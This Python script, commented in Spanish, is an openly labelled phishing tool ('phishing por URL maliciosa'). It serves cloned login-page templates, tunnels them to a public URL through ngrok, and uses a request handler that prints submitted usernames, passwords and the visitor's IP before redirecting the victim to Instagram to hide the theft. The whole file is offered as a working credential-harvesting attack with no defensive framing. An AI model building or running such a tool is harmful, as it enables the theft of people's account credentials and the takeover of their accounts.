import os
import subprocess
import time
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json
import urllib.request

class Colors:
    """Clase para manejar colores en la terminal."""
    HEADER = '\033[95m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    YELLOW = '\033[93m'

def find_free_port(start_port=8080, end_port=8090):
    """Busca un puerto libre dentro de un rango dado (por defecto de 8080 a 8090)."""
    for port in range(start_port, end_port + 1):
        result = subprocess.run(f"lsof -i :{port}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:  # Si el puerto no está en uso
            return port
    return None  # Si no se encuentra un puerto libre en el rango

def kill_process_on_port(port):
    """Mata el proceso que está utilizando el puerto especificado."""
    try:
        result = subprocess.check_output(f"lsof -t -i :{port}", shell=True).decode().strip()
        if result:
            pid = result
            print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Deteniendo el proceso en el puerto {port} (PID: {pid})...")
            subprocess.run(f"kill -9 {pid}", shell=True, check=True)
            print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Proceso detenido correctamente (PID: {pid}).")
        else:
            print(f"{Colors.WARNING}[INFO]{Colors.ENDC} No hay procesos en el puerto {port}.")
    except subprocess.CalledProcessError:
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} No se pudo detener el proceso en el puerto {port}.")

def check_if_port_in_use(port):
    """Verifica si un puerto sigue en uso."""
    try:
        result = subprocess.check_output(f"lsof -i :{port}", shell=True).decode().strip()
        return bool(result)
    except subprocess.CalledProcessError:
        return False

class MyHandler(BaseHTTPRequestHandler):
    """Manejador para capturar y mostrar datos de formularios enviados."""

    def log_data(self, data, ip):
        """Mostrar los datos en consola sin guardarlos en un archivo."""
        user = data.get('user', [''])[0]
        password = data.get('password', [''])[0]
        
        # Mostrar en consola los datos recibidos
        print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Datos recibidos de {ip}:")
        print(f"  {Colors.YELLOW}[INFO]{Colors.ENDC} Usuario: {user}")
        print(f"  {Colors.YELLOW}[INFO]{Colors.ENDC} Contraseña: {password}")

    def do_GET(self):
        """Método para manejar la solicitud GET y redirigir a Instagram."""
        # Extraer los parámetros de la URL
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)
        
        # Obtener la IP del visitante
        ip = self.client_address[0]
        
        # Mostrar los datos del formulario en la terminal
        print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Datos recibidos en el formulario de {ip}:")
        for key, value in query_params.items():
            print(f"{Colors.YELLOW}[INFO]{Colors.ENDC} {key}: {value}")
        
        # Mostrar las credenciales sin guardarlas
        self.log_data(query_params, ip)

        # Verificar si la solicitud contiene "login=Log+In" y guardar el GET
        if "login=Log+In" in self.path:
            print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Solicitud GET detectada: {self.path}")

        # Redirigir a Instagram
        self.send_response(302)  # Redirección temporal
        self.send_header('Location', 'https://www.instagram.com')  # Redirigir a Instagram
        self.end_headers()

def start_http_server(port=8080, template_dir="./templates/logins/"):
    """Inicia un servidor HTTP simple para escuchar los datos del formulario y servir archivos estáticos."""
    os.chdir(template_dir)  # Cambiar al directorio de la plantilla seleccionada
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyHandler)  # Cambiar a MyHandler
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Servidor HTTP iniciado en el puerto {port}. Esperando datos...\n")
    httpd.serve_forever()

def phishing_by_url():
    """Función para el phishing por URL maliciosa (con ngrok siempre)."""
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Phishing por URL maliciosa seleccionado.\n")

    templates_dir = "./templates/logins/"
    templates = [f for f in os.listdir(templates_dir) if os.path.isdir(os.path.join(templates_dir, f))]
    if not templates:
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} No se encontraron templates en {templates_dir}.")
        return

    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Templates disponibles:")
    for i, template in enumerate(templates, 1):
        print(f"  {i}. {template}")
    
    try:
        choice = int(input(f"{Colors.HEADER}[INFO]{Colors.ENDC} Selecciona un template (1-{len(templates)}): "))
        if choice < 1 or choice > len(templates):
            raise ValueError
    except ValueError:
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} Selección inválida.")
        return

    selected_template = templates[choice - 1]
    print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Template seleccionado: {selected_template}\n")

    # Verificar y matar procesos en el puerto 8080 si es necesario
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Verificando si el puerto 8080 está en uso...")
    kill_process_on_port(8080)

    # Buscar un puerto libre
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Buscando un puerto libre...")
    port = find_free_port(8080, 8090)
    if not port:
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} No se encontró un puerto libre en el rango 8080-8090.")
        return

    print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Puerto libre encontrado: {port}")

    # Preparar servidor para el template seleccionado
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Preparando servidor con template {selected_template} en el puerto {port}...")

    # Asegurarse de usar la ruta absoluta del directorio
    absolute_template_dir = os.path.abspath(os.path.join(templates_dir, selected_template))
    
    # Verificar que el directorio existe
    if not os.path.exists(absolute_template_dir):
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} El directorio {absolute_template_dir} no existe.")
        return

    # Levantar el servidor HTTP antes de iniciar ngrok
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Iniciando servidor HTTP con la plantilla seleccionada...")
    subprocess.Popen(["python3", "-m", "http.server", str(port)], cwd=absolute_template_dir)
    print(f"{Colors.GREEN}[INFO]{Colors.ENDC} Servidor HTTP iniciado en el puerto {port}.")

    # Ejecutar ngrok después de levantar el servidor HTTP
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Iniciando ngrok...")
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Ingresa a http://127.0.0.1:4040/status para poder visualizar la URL del túnel")

    # Verificar si ngrok está disponible
    if not shutil.which("ngrok"):
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} ngrok no está instalado o no se encuentra en el PATH.")
        return

    # Ejecutar ngrok en un subproceso
    try:
        result = subprocess.run(["ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} Error al ejecutar ngrok:")
            print(result.stderr)
        else:
            print(f"{Colors.HEADER}[INFO]{Colors.ENDC} ngrok está activo. La URL generada es:")
            time.sleep(10)
            with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels") as response:
                tunnels = json.load(response)
                
                if 'tunnels' in tunnels and len(tunnels['tunnels']) > 0:
                    public_url = tunnels['tunnels'][0].get('public_url')
                    if public_url:
                        print(f"  {Colors.GREEN}[INFO]{Colors.ENDC} URL pública: {public_url}")
                        # Mostrar URL de ngrok después de iniciar el servidor HTTP
                    else:
                        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} No se pudo obtener la URL pública de ngrok.")
    except Exception as e:
        print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} Error al ejecutar ngrok: {str(e)}")

# Ejecución del script
if __name__ == "__main__":
    phishing_by_url()
